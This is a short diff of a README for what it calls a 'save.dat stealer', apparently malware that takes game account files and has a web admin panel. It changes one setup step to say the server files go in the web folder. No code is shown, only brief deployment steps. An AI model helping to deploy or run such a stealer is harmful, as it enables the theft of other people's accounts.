@@ -28,6 +28,6 @@ New good-looking save.dat stealer with simple administration.
     
     
 # Server - setup:
-1.) Copy all client files to your webpage folder.  
+1.) Copy all server files to your webpage folder.  
 2.) Go to main page and create password for your website.  
 3.) Now you are ready to use it!  
